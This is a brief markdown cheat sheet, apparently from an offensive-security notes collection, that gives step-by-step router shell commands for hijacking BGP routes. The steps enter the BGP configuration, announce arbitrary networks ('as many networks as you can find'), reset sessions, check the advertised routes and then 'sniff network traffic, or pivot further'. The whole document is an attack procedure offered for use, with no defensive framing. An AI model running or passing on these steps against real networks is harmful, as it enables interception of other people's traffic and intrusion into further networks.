# BORDER GATEWAY PROTOCOL HIJACKING (BGP)

### STEPS/COMMANDS:

#### 1) vtysh ( Run BGP config shell )

#### 2) config terminal

#### 3) router bgp NUM

#### 4) network HOST/CIDR (You can try to route as many networks as you can find)

#### 5) end

#### 6) clear ip bgp *

#### 7) show ip bgp neighbors YOUR_IP advertised-routes (Check on the route)

#### 8) Now you can sniff network traffic, or pivot further through more networks!
